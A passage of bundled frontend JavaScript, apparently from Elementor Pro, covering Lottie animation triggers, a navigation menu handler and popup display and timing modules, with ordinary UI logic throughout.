    return this.lottie.__initialFirstFrame + (this.lottie.__initialTotalFrames - this.lottie.__initialFirstFrame) * percent / 100;
  }

  getAnimationCurrentFrame() {
    // When pausing the animation (when out of viewport) the first frame of the animation changes.
    return 0 === this.lottie.firstFrame ? this.lottie.currentFrame : this.lottie.firstFrame + this.lottie.currentFrame;
  }

  setLinkTimeout() {
    var _lottieSettings$custo;

    const lottieSettings = this.getLottieSettings();

    if ('on_click' === lottieSettings.trigger && (_lottieSettings$custo = lottieSettings.custom_link) !== null && _lottieSettings$custo !== void 0 && _lottieSettings$custo.url && lottieSettings.link_timeout) {
      this.elements.$containerLink.on('click', event => {
        event.preventDefault();

        if (!this.isEdit) {
          setTimeout(() => {
            const tabTarget = 'on' === lottieSettings.custom_link.is_external ? '_blank' : '_self';
            window.open(lottieSettings.custom_link.url, tabTarget);
          }, lottieSettings.link_timeout);
        }
      });
    }
  }

  bindAnimationClickEvents() {
    this.listeners.elements.$container.triggerAnimationClick = () => {
      this.playLottie();
    };

    this.addSessionEventListener(this.elements.$container, 'click', this.listeners.elements.$container.triggerAnimationClick);
  }

  getLottieSettings() {
    const lottieSettings = this.getElementSettings();
    return { ...lottieSettings,
      lazyload: 'yes' === lottieSettings.lazyload,
      loop: 'yes' === lottieSettings.loop
    };
  }

  playLottie() {
    const frame = this.getAnimationFrames();
    this.lottie.stop();
    this.lottie.playSegments([frame.first, frame.last], true); // We reset the loop cycle state after playing the animation.

    this.state.isNewLoopCycle = false;
  }

  bindAnimationHoverEvents() {
    this.createAnimationHoverInEvents();
    this.createAnimationHoverOutEvents();
  }

  createAnimationHoverInEvents() {
    const lottieSettings = this.getLottieSettings(),
          $widgetArea = this.getHoverAreaElement();
    this.state.hoverArea = lottieSettings.hover_area;

    this.listeners.elements.$widgetArea.triggerAnimationHoverIn = () => {
      this.state.animationDirection = 'forward';
      this.playLottie();
    };

    this.addSessionEventListener($widgetArea, 'mouseenter', this.listeners.elements.$widgetArea.triggerAnimationHoverIn);
  }
  /**
   * @param {jQuery} $el
   * @param {string} event - event type
   * @param {Function} callback
   */


  addSessionEventListener($el, event, callback) {
    $el.on(event, callback);
    this.listeners.collection.push({
      $el,
      event,
      callback
    });
  }

  createAnimationHoverOutEvents() {
    const lottieSettings = this.getLottieSettings(),
          $widgetArea = this.getHoverAreaElement();

    if ('pause' === lottieSettings.on_hover_out || 'reverse' === lottieSettings.on_hover_out) {
      this.state.hoverOutMode = lottieSettings.on_hover_out;

      this.listeners.elements.$widgetArea.triggerAnimationHoverOut = () => {
        if ('pause' === lottieSettings.on_hover_out) {
          this.lottie.pause();
        } else {
          this.state.animationDirection = 'backward';
          this.playLottie();
        }
      };

      this.addSessionEventListener($widgetArea, 'mouseleave', this.listeners.elements.$widgetArea.triggerAnimationHoverOut);
    }
  }

  getHoverAreaElement() {
    const lottieSettings = this.getLottieSettings();

    if ('section' === lottieSettings.hover_area) {
      return this.elements.$sectionParent;
    } else if ('column' === lottieSettings.hover_area) {
      return this.elements.$columnParent;
    }

    return this.elements.$container;
  }

  setLoopOnAnimationComplete() {
    const lottieSettings = this.getLottieSettings();
    this.state.isNewLoopCycle = true;

    if (lottieSettings.loop && !this.isReverseMode()) {
      this.setLoopWhenNotReverse();
    } else if (lottieSettings.loop && this.isReverseMode()) {
      this.setReverseAnimationOnLoop();
    } else if (!lottieSettings.loop && this.isReverseMode()) {
      this.setReverseAnimationOnSingleTrigger();
    }
  }

  isReverseMode() {
    const lottieSettings = this.getLottieSettings();
    return 'yes' === lottieSettings.reverse_animation || 'reverse' === lottieSettings.on_hover_out && 'backward' === this.state.animationDirection;
  }

  setLoopWhenNotReverse() {
    const lottieSettings = this.getLottieSettings();

    if (lottieSettings.number_of_times > 0) {
      this.state.playAnimationCount++;

      if (this.state.playAnimationCount < lottieSettings.number_of_times) {
        this.playLottie();
      } else {
        this.state.playAnimationCount = 0;
      }
    } else {
      this.playLottie();
    }
  }

  setReverseAnimationOnLoop() {
    const lottieSettings = this.getLottieSettings();
    /*
    We trigger the reverse animation:
    either when we don't have any value in the 'Number of Times" field, and then it will be an infinite forward/backward loop,
    or, when we have a value in the 'Number of Times" field and then we need to limit the number of times of the loop cycles.
     */

    if (!lottieSettings.number_of_times || this.state.playAnimationCount < lottieSettings.number_of_times) {
      this.state.animationDirection = 'forward' === this.state.animationDirection ? 'backward' : 'forward';
      this.playLottie();
      /*
      We need to increment the count only on the backward movements,
      because forward movement + backward movement are equal together to one full movement count.
      */

      if ('backward' === this.state.animationDirection) {
        this.state.playAnimationCount++;
      }
    } else {
      // Reset the values for the loop counting for the next trigger.
      this.state.playAnimationCount = 0;
      this.state.animationDirection = 'forward';
    }
  }

  setReverseAnimationOnSingleTrigger() {
    if (this.state.playAnimationCount < 1) {
      this.state.playAnimationCount++;
      this.state.animationDirection = 'backward';
      this.playLottie();
    } else if (this.state.playAnimationCount >= 1 && 'forward' === this.state.animationDirection) {
      this.state.animationDirection = 'backward';
      this.playLottie();
    } else {
      this.state.playAnimationCount = 0;
      this.state.animationDirection = 'forward';
    }
  }

  setAnimationSpeed() {
    const lottieSettings = this.getLottieSettings();

    if (lottieSettings.play_speed) {
      this.lottie.setSpeed(lottieSettings.play_speed.size);
    }
  }

  onElementChange() {
    this.updateLottieValues();
    this.resetAnimationTrigger();
  }

  updateLottieValues() {
    var _lottieSettings$play_2;

    const lottieSettings = this.getLottieSettings(),
          valuesComparison = [{
      sourceVal: (_lottieSettings$play_2 = lottieSettings.play_speed) === null || _lottieSettings$play_2 === void 0 ? void 0 : _lottieSettings$play_2.size,
      stateProp: 'animationSpeed',
      callback: () => this.setAnimationSpeed()
    }, {
      sourceVal: lottieSettings.link_timeout,
      stateProp: 'linkTimeout',
      callback: () => this.setLinkTimeout()
    }, {
      sourceVal: lottieSettings.caption,
      stateProp: 'caption',
      callback: () => this.setCaption()
    }, {
      sourceVal: lottieSettings.effects_relative_to,
      stateProp: 'effectsRelativeTo',
      callback: () => this.updateAnimationByScrollPosition()
    }, {
      sourceVal: lottieSettings.loop,
      stateProp: 'loop',
      callback: () => this.onLoopStateChange()
    }];
    valuesComparison.forEach(item => {
      if ('undefined' !== typeof item.sourceVal && item.sourceVal !== this.state[item.stateProp]) {
        this.state[item.stateProp] = item.sourceVal;
        item.callback();
      }
    });
  }

  onLoopStateChange() {
    const isInActiveViewportMode = 'arriving_to_viewport' === this.state.currentAnimationTrigger && this.state.isInViewport;

    if (this.state.loop && (isInActiveViewportMode || 'none' === this.state.currentAnimationTrigger)) {
      this.playLottie();
    }
  }

  resetAnimationTrigger() {
    const lottieSettings = this.getLottieSettings(),
          isTriggerChange = lottieSettings.trigger !== this.state.currentAnimationTrigger,
          isViewportOffsetChange = lottieSettings.viewport ? this.isViewportOffsetChange() : false,
          isHoverOutModeChange = lottieSettings.on_hover_out ? this.isHoverOutModeChange() : false,
          isHoverAreaChange = lottieSettings.hover_area ? this.isHoverAreaChange() : false;

    if (isTriggerChange || isViewportOffsetChange || isHoverOutModeChange || isHoverAreaChange) {
      this.removeAnimationFrameRequests();
      this.removeObservers();
      this.removeEventListeners();
      this.initAnimationTrigger();
    }
  }

  isViewportOffsetChange() {
    const lottieSettings = this.getLottieSettings(),
          isStartOffsetChange = lottieSettings.viewport.sizes.start !== this.state.viewportOffset.start,
          isEndOffsetChange = lottieSettings.viewport.sizes.end !== this.state.viewportOffset.end;
    return isStartOffsetChange || isEndOffsetChange;
  }

  isHoverOutModeChange() {
    const lottieSettings = this.getLottieSettings();
    return lottieSettings.on_hover_out !== this.state.hoverOutMode;
  }

  isHoverAreaChange() {
    const lottieSettings = this.getLottieSettings();
    return lottieSettings.hover_area !== this.state.hoverArea;
  }

  removeEventListeners() {
    this.listeners.collection.forEach(listener => {
      listener.$el.off(listener.event, null, listener.callback);
    });
  }

  removeObservers() {
    // Removing all observers.
    for (const type in this.intersectionObservers) {
      if (this.intersectionObservers[type].observer && this.intersectionObservers[type].element) {
        this.intersectionObservers[type].observer.unobserve(this.intersectionObservers[type].element);
      }
    }
  }

  removeAnimationFrameRequests() {
    cancelAnimationFrame(this.animationFrameRequest.timer);
  }

  onDestroy() {
    super.onDestroy();
    this.destroyLottie();
  }

  destroyLottie() {
    this.removeAnimationFrameRequests();
    this.removeObservers();
    this.removeEventListeners();
    this.elements.$animation.removeData('lottie');

    if (this.lottie) {
      this.lottie.destroy();
    }
  }

  onLottieDomLoaded() {
    this.saveInitialValues();
    this.setAnimationSpeed();
    this.setLinkTimeout();
    this.setCaption();
    this.setAnimationFirstFrame();
    this.initAnimationTrigger();
  }

  onComplete() {
    this.setLoopOnAnimationComplete();
  }

  onLottieIntersection(event) {
    if (event.isInViewport) {
      /*
      It's required to update the animation progress on first load when lottie is inside the viewport on load
      but, there is a problem when the browser is refreshed when the scroll bar is not in 0 position,
      in this scenario, after the refresh the browser will trigger 2 scroll events
      one trigger on immediate load and second after a f ew ms to move the scroll bar to previous position (before refresh)
      therefore, we use the this.state.isAnimationScrollUpdateNeededOnFirstLoad flag
      to make sure that this.updateAnimationByScrollPosition() function will be triggered only once.
       */
      if (this.state.isAnimationScrollUpdateNeededOnFirstLoad) {
        this.state.isAnimationScrollUpdateNeededOnFirstLoad = false;
        this.updateAnimationByScrollPosition();
      }

      this.animationFrameRequest.timer = requestAnimationFrame(() => this.onAnimationFrameRequest());
    } else {
      const frame = this.getAnimationFrames(),
            finalFrame = 'up' === event.intersectionScrollDirection ? frame.first : frame.last;
      this.state.isAnimationScrollUpdateNeededOnFirstLoad = false;
      cancelAnimationFrame(this.animationFrameRequest.timer); // Set the animation values to min/max when out of viewport.

      this.lottie.goToAndStop(finalFrame, true);
    }
  }

  onAnimationFrameRequest() {
    // Making calculation only when there is a change with the scroll position.
    if (window.scrollY !== this.animationFrameRequest.lastScrollY) {
      this.updateAnimationByScrollPosition();
      this.animationFrameRequest.lastScrollY = window.scrollY;
    }

    this.animationFrameRequest.timer = requestAnimationFrame(() => this.onAnimationFrameRequest());
  }

}

exports.default = lottieHandler;

/***/ }),

/***/ "../modules/nav-menu/assets/js/frontend/frontend-legacy.js":
/*!*****************************************************************!*\
  !*** ../modules/nav-menu/assets/js/frontend/frontend-legacy.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _navMenu = _interopRequireDefault(__webpack_require__(/*! ./handlers/nav-menu */ "../modules/nav-menu/assets/js/frontend/handlers/nav-menu.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();

    if (jQuery.fn.smartmenus) {
      // Override the default stupid detection
      jQuery.SmartMenus.prototype.isCSSOn = function () {
        return true;
      };

      if (elementorFrontend.config.is_rtl) {
        jQuery.fn.smartmenus.defaults.rightToLeftSubMenus = true;
      }
    }

    elementorFrontend.elementsHandler.attachHandler('nav-menu', _navMenu.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/nav-menu/assets/js/frontend/handlers/nav-menu.js":
/*!*******************************************************************!*\
  !*** ../modules/nav-menu/assets/js/frontend/handlers/nav-menu.js ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  stretchElement: null,

  getDefaultSettings() {
    return {
      selectors: {
        menu: '.elementor-nav-menu',
        anchorLink: '.elementor-nav-menu--main .elementor-item-anchor',
        dropdownMenu: '.elementor-nav-menu__container.elementor-nav-menu--dropdown',
        menuToggle: '.elementor-menu-toggle'
      }
    };
  },

  getDefaultElements() {
    var selectors = this.getSettings('selectors'),
        elements = {};
    elements.$menu = this.$element.find(selectors.menu);
    elements.$anchorLink = this.$element.find(selectors.anchorLink);
    elements.$dropdownMenu = this.$element.find(selectors.dropdownMenu);
    elements.$dropdownMenuFinalItems = elements.$dropdownMenu.find('.menu-item:not(.menu-item-has-children) > a');
    elements.$menuToggle = this.$element.find(selectors.menuToggle);
    elements.$links = elements.$dropdownMenu.find('a.elementor-item');
    return elements;
  },

  bindEvents() {
    if (!this.elements.$menu.length) {
      return;
    }

    this.elements.$menuToggle.on('click', this.toggleMenu.bind(this));

    if (this.getElementSettings('full_width')) {
      this.elements.$dropdownMenuFinalItems.on('click', this.toggleMenu.bind(this, false));
    }

    elementorFrontend.addListenerOnce(this.$element.data('model-cid'), 'resize', this.stretchMenu);
  },

  initStretchElement() {
    this.stretchElement = new elementorModules.frontend.tools.StretchElement({
      element: this.elements.$dropdownMenu
    });
  },

  toggleNavLinksTabIndex(enabled = true) {
    this.elements.$links.attr('tabindex', enabled ? 0 : -1);
  },

  toggleMenu(show) {
    var isDropdownVisible = this.elements.$menuToggle.hasClass('elementor-active');

    if ('boolean' !== typeof show) {
      show = !isDropdownVisible;
    }

    this.elements.$menuToggle.attr('aria-expanded', show);
    this.elements.$dropdownMenu.attr('aria-hidden', !show);
    this.elements.$menuToggle.toggleClass('elementor-active', show);
    this.toggleNavLinksTabIndex(show);

    if (show && this.getElementSettings('full_width')) {
      this.stretchElement.stretch();
    }
  },

  followMenuAnchors() {
    var self = this;
    self.elements.$anchorLink.each(function () {
      if (location.pathname === this.pathname && '' !== this.hash) {
        self.followMenuAnchor(jQuery(this));
      }
    });
  },

  followMenuAnchor($element) {
    const anchorSelector = $element[0].hash;
    let offset = -300,
        $anchor;

    try {
      // `decodeURIComponent` for UTF8 characters in the hash.
      $anchor = jQuery(decodeURIComponent(anchorSelector));
    } catch (e) {
      return;
    }

    if (!$anchor.length) {
      return;
    }

    if (!$anchor.hasClass('elementor-menu-anchor')) {
      var halfViewport = jQuery(window).height() / 2;
      offset = -$anchor.outerHeight() + halfViewport;
    }

    elementorFrontend.waypoint($anchor, function (direction) {
      if ('down' === direction) {
        $element.addClass('elementor-item-active');
      } else {
        $element.removeClass('elementor-item-active');
      }
    }, {
      offset: '50%',
      triggerOnce: false
    });
    elementorFrontend.waypoint($anchor, function (direction) {
      if ('down' === direction) {
        $element.removeClass('elementor-item-active');
      } else {
        $element.addClass('elementor-item-active');
      }
    }, {
      offset,
      triggerOnce: false
    });
  },

  stretchMenu() {
    if (this.getElementSettings('full_width')) {
      this.stretchElement.stretch();
      this.elements.$dropdownMenu.css('top', this.elements.$menuToggle.outerHeight());
    } else {
      this.stretchElement.reset();
    }
  },

  onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);

    if (!this.elements.$menu.length) {
      return;
    }

    const elementSettings = this.getElementSettings(),
          iconValue = elementSettings.submenu_icon.value;
    let subIndicatorsContent = '';

    if (iconValue) {
      // The value of iconValue can be either className inside the editor or a markup in the frontend.
      subIndicatorsContent = iconValue.indexOf('<') > -1 ? iconValue : `<i class="${iconValue}"></i>`;
    } // subIndicators param - Added for backwards compatibility:
    // If the old 'indicator' control value = 'none', the <span class="sub-arrow"> wrapper element is removed


    this.elements.$menu.smartmenus({
      subIndicators: '' !== subIndicatorsContent,
      subIndicatorsText: subIndicatorsContent,
      subIndicatorsPos: 'append',
      subMenusMaxWidth: '1000px'
    });
    this.initStretchElement();
    this.stretchMenu();

    if (!elementorFrontend.isEditMode()) {
      this.followMenuAnchors();
    }
  },

  onElementChange(propertyName) {
    if ('full_width' === propertyName) {
      this.stretchMenu();
    }
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/document.js":
/*!*******************************************************!*\
  !*** ../modules/popup/assets/js/frontend/document.js ***!
  \*******************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _triggers = _interopRequireDefault(__webpack_require__(/*! ./triggers */ "../modules/popup/assets/js/frontend/triggers.js"));

var _timing = _interopRequireDefault(__webpack_require__(/*! ./timing */ "../modules/popup/assets/js/frontend/timing.js"));

var _eIcons = __webpack_require__(/*! @elementor-pro/e-icons */ "../assets/dev/js/frontend/utils/icons/e-icons.js");

// Temporary solution, when core 3.5.0 will be the minimum version, is should be replaced with @elementor/e-icons.
class _default extends elementorModules.frontend.Document {
  bindEvents() {
    const openSelector = this.getDocumentSettings('open_selector');

    if (openSelector) {
      elementorFrontend.elements.$body.on('click', openSelector, this.showModal.bind(this));
    }
  }

  startTiming() {
    const timing = new _timing.default(this.getDocumentSettings('timing'), this);

    if (timing.check()) {
      this.initTriggers();
    }
  }

  initTriggers() {
    this.triggers = new _triggers.default(this.getDocumentSettings('triggers'), this);
  }

  showModal(avoidMultiple) {
    const settings = this.getDocumentSettings();

    if (!this.isEdit) {
      if (!elementorFrontend.isWPPreviewMode()) {
        if (this.getStorage('disable')) {
          return;
        }

        if (avoidMultiple && elementorProFrontend.modules.popup.popupPopped && settings.avoid_multiple_popups) {
          return;
        }
      } // A clean copy of the element without previous initializations and events


      this.$element = jQuery(this.elementHTML);
      this.elements.$elements = this.$element.find(this.getSettings('selectors.elements'));
    }

    const modal = this.getModal(),
          $closeButton = modal.getElements('closeButton');
    modal.setMessage(this.$element).show();

    if (!this.isEdit) {
      if (settings.close_button_delay) {
        $closeButton.hide();
        clearTimeout(this.closeButtonTimeout);
        this.closeButtonTimeout = setTimeout(() => $closeButton.show(), settings.close_button_delay * 1000);
      }

      super.runElementsHandlers();
    }

    this.setEntranceAnimation();

    if (!settings.timing || !settings.timing.times_count) {
      this.countTimes();
    }

    elementorProFrontend.modules.popup.popupPopped = true;
  }

  setEntranceAnimation() {
    const $widgetContent = this.getModal().getElements('widgetContent'),
          settings = this.getDocumentSettings(),
          newAnimation = elementorFrontend.getCurrentDeviceSetting(settings, 'entrance_animation');

    if (this.currentAnimation) {
      $widgetContent.removeClass(this.currentAnimation);
    }

    this.currentAnimation = newAnimation;

    if (!newAnimation) {
      return;
    }

    const animationDuration = settings.entrance_animation_duration.size;
    $widgetContent.addClass(newAnimation);
    setTimeout(() => $widgetContent.removeClass(newAnimation), animationDuration * 1000);
  }

  setExitAnimation() {
    const modal = this.getModal(),
          settings = this.getDocumentSettings(),
          $widgetContent = modal.getElements('widgetContent'),
          newAnimation = elementorFrontend.getCurrentDeviceSetting(settings, 'exit_animation'),
          animationDuration = newAnimation ? settings.entrance_animation_duration.size : 0;
    setTimeout(() => {
      if (newAnimation) {
        $widgetContent.removeClass(newAnimation + ' reverse');
      }

      if (!this.isEdit) {
        this.$element.remove();
        modal.getElements('widget').hide();
      }
    }, animationDuration * 1000);

    if (newAnimation) {
      $widgetContent.addClass(newAnimation + ' reverse');
    }
  }

  initModal() {
    let modal;

    this.getModal = () => {
      if (!modal) {
        const settings = this.getDocumentSettings(),
              id = this.getSettings('id'),
              triggerPopupEvent = eventType => elementorFrontend.elements.$document.trigger('elementor/popup/' + eventType, [id, this]);

        let classes = 'elementor-popup-modal';

        if (settings.classes) {
          classes += ' ' + settings.classes;
        }

        const modalProperties = {
          id: 'elementor-popup-modal-' + id,
          className: classes,
          closeButton: true,
          preventScroll: settings.prevent_scroll,
          onShow: () => triggerPopupEvent('show'),
          onHide: () => triggerPopupEvent('hide'),
          effects: {
            hide: () => {
              if (settings.timing && settings.timing.times_count) {
                this.countTimes();
              }

              this.setExitAnimation();
            },
            show: 'show'
          },
          hide: {
            auto: !!settings.close_automatically,
            autoDelay: settings.close_automatically * 1000,
            onBackgroundClick: !settings.prevent_close_on_background_click,
            onOutsideClick: !settings.prevent_close_on_background_click,
            onEscKeyPress: !settings.prevent_close_on_esc_key,
            ignore: '.flatpickr-calendar'
          },
          position: {
            enable: false
          }
        };

        if (elementorFrontend.config.experimentalFeatures.e_font_icon_svg) {
          modalProperties.closeButtonOptions = {
            iconElement: _eIcons.close.element
          };
        } // This line should be moved to the condition above, as an 'else' case, once the core minimum version is 3.5.0.


        modalProperties.closeButtonClass = 'eicon-close';
        modal = elementorFrontend.getDialogsManager().createWidget('lightbox', modalProperties);
        modal.getElements('widgetContent').addClass('animated');
        const $closeButton = modal.getElements('closeButton');

        if (this.isEdit) {
          $closeButton.off('click');

          modal.hide = () => {};
        }

        this.setCloseButtonPosition();
      }

      return modal;
    };
  }

  setCloseButtonPosition() {
    const modal = this.getModal(),
          closeButtonPosition = this.getDocumentSettings('close_button_position'),
          $closeButton = modal.getElements('closeButton');
    $closeButton.appendTo(modal.getElements('outside' === closeButtonPosition ? 'widget' : 'widgetContent'));
  }

  disable() {
    this.setStorage('disable', true);
  }

  setStorage(key, value, options) {
    elementorFrontend.storage.set(`popup_${this.getSettings('id')}_${key}`, value, options);
  }

  getStorage(key, options) {
    return elementorFrontend.storage.get(`popup_${this.getSettings('id')}_${key}`, options);
  }

  countTimes() {
    const displayTimes = this.getStorage('times') || 0;
    this.setStorage('times', displayTimes + 1);
  }

  runElementsHandlers() {}

  async onInit() {
    super.onInit(); // In case that the library was not loaded, it indicates a Core version that enables dynamic loading.

    if (!window.DialogsManager) {
      await elementorFrontend.utils.assetsLoader.load('script', 'dialog');
    }

    this.initModal();

    if (this.isEdit) {
      this.showModal();
      return;
    }

    this.$element.show().remove();
    this.elementHTML = this.$element[0].outerHTML;

    if (elementorFrontend.isEditMode()) {
      return;
    }

    if (elementorFrontend.isWPPreviewMode() && elementorFrontend.config.post.id === this.getSettings('id')) {
      this.showModal();
      return;
    }

    this.startTiming();
  }

  onSettingsChange(model) {
    const changedKey = Object.keys(model.changed)[0];

    if (-1 !== changedKey.indexOf('entrance_animation')) {
      this.setEntranceAnimation();
    }

    if ('exit_animation' === changedKey) {
      this.setExitAnimation();
    }

    if ('close_button_position' === changedKey) {
      this.setCloseButtonPosition();
    }
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/frontend-legacy.js":
/*!**************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/frontend-legacy.js ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _document = _interopRequireDefault(__webpack_require__(/*! ./document */ "../modules/popup/assets/js/frontend/document.js"));

var _formsAction = _interopRequireDefault(__webpack_require__(/*! ./handlers/forms-action */ "../modules/popup/assets/js/frontend/handlers/forms-action.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.hooks.addAction('elementor/frontend/documents-manager/init-classes', this.addDocumentClass);
    elementorFrontend.elementsHandler.attachHandler('form', _formsAction.default);
    elementorFrontend.on('components:init', () => this.onFrontendComponentsInit());

    if (!elementorFrontend.isEditMode() && !elementorFrontend.isWPPreviewMode()) {
      this.setViewsAndSessions();
    }
  }

  addDocumentClass(documentsManager) {
    documentsManager.addDocumentClass('popup', _document.default);
  }

  setViewsAndSessions() {
    const pageViews = elementorFrontend.storage.get('pageViews') || 0;
    elementorFrontend.storage.set('pageViews', pageViews + 1);
    const activeSession = elementorFrontend.storage.get('activeSession', {
      session: true
    });

    if (!activeSession) {
      elementorFrontend.storage.set('activeSession', true, {
        session: true
      });
      const sessions = elementorFrontend.storage.get('sessions') || 0;
      elementorFrontend.storage.set('sessions', sessions + 1);
    }
  }

  showPopup(settings) {
    const popup = elementorFrontend.documentsManager.documents[settings.id];

    if (!popup) {
      return;
    }

    const modal = popup.getModal();

    if (settings.toggle && modal.isVisible()) {
      modal.hide();
    } else {
      popup.showModal();
    }
  }

  closePopup(settings, event) {
    const popupID = jQuery(event.target).parents('[data-elementor-type="popup"]').data('elementorId');

    if (!popupID) {
      return;
    }

    const document = elementorFrontend.documentsManager.documents[popupID];
    document.getModal().hide();

    if (settings.do_not_show_again) {
      document.disable();
    }
  }

  onFrontendComponentsInit() {
    elementorFrontend.utils.urlActions.addAction('popup:open', settings => this.showPopup(settings));
    elementorFrontend.utils.urlActions.addAction('popup:close', (settings, event) => this.closePopup(settings, event));
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/handlers/forms-action.js":
/*!********************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/handlers/forms-action.js ***!
  \********************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  getDefaultSettings() {
    return {
      selectors: {
        form: '.elementor-form'
      }
    };
  },

  getDefaultElements() {
    var selectors = this.getSettings('selectors'),
        elements = {};
    elements.$form = this.$element.find(selectors.form);
    return elements;
  },

  bindEvents() {
    this.elements.$form.on('submit_success', this.handleFormAction);
  },

  handleFormAction(event, response) {
    if ('undefined' === typeof response.data.popup) {
      return;
    }

    const popupSettings = response.data.popup;

    if ('open' === popupSettings.action) {
      return elementorProFrontend.modules.popup.showPopup(popupSettings);
    }

    setTimeout(() => {
      return elementorProFrontend.modules.popup.closePopup(popupSettings, event);
    }, 1000);
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing.js":
/*!*****************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing.js ***!
  \*****************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _pageViews = _interopRequireDefault(__webpack_require__(/*! ./timing/page-views */ "../modules/popup/assets/js/frontend/timing/page-views.js"));

var _sessions = _interopRequireDefault(__webpack_require__(/*! ./timing/sessions */ "../modules/popup/assets/js/frontend/timing/sessions.js"));

var _url = _interopRequireDefault(__webpack_require__(/*! ./timing/url */ "../modules/popup/assets/js/frontend/timing/url.js"));

var _sources = _interopRequireDefault(__webpack_require__(/*! ./timing/sources */ "../modules/popup/assets/js/frontend/timing/sources.js"));

var _loggedIn = _interopRequireDefault(__webpack_require__(/*! ./timing/logged-in */ "../modules/popup/assets/js/frontend/timing/logged-in.js"));

var _devices = _interopRequireDefault(__webpack_require__(/*! ./timing/devices */ "../modules/popup/assets/js/frontend/timing/devices.js"));

var _times = _interopRequireDefault(__webpack_require__(/*! ./timing/times */ "../modules/popup/assets/js/frontend/timing/times.js"));

var _browsers = _interopRequireDefault(__webpack_require__(/*! ./timing/browsers */ "../modules/popup/assets/js/frontend/timing/browsers.js"));

class _default extends elementorModules.Module {
  constructor(settings, document) {
    super(settings);
    this.document = document;
    this.timingClasses = {
      page_views: _pageViews.default,
      sessions: _sessions.default,
      url: _url.default,
      sources: _sources.default,
      logged_in: _loggedIn.default,
      devices: _devices.default,
      times: _times.default,
      browsers: _browsers.default
    };
  }

  check() {
    const settings = this.getSettings();
    let checkPassed = true;
    jQuery.each(this.timingClasses, (key, TimingClass) => {
      if (!settings[key]) {
        return;
      }

      const timing = new TimingClass(settings, this.document);

      if (!timing.check()) {
        checkPassed = false;
      }
    });
    return checkPassed;
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/base.js":
/*!**********************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/base.js ***!
  \**********************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class _default extends elementorModules.Module {
  constructor(settings, document) {
    super(settings);
    this.document = document;
  }

  getTimingSetting(settingKey) {
    return this.getSettings(this.getName() + '_' + settingKey);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/browsers.js":
/*!**************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/browsers.js ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'browsers';
  }

  check() {
    if ('all' === this.getTimingSetting('browsers')) {
      return true;
    }

    const targetedBrowsers = this.getTimingSetting('browsers_options'),
          browserDetectionFlags = elementorFrontend.utils.environment;
    return targetedBrowsers.some(browserName => browserDetectionFlags[browserName]);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/devices.js":
/*!*************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/devices.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'devices';
  }

  check() {
    return -1 !== this.getTimingSetting('devices').indexOf(elementorFrontend.getCurrentDeviceMode());
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/logged-in.js":
/*!***************************************************************!*\
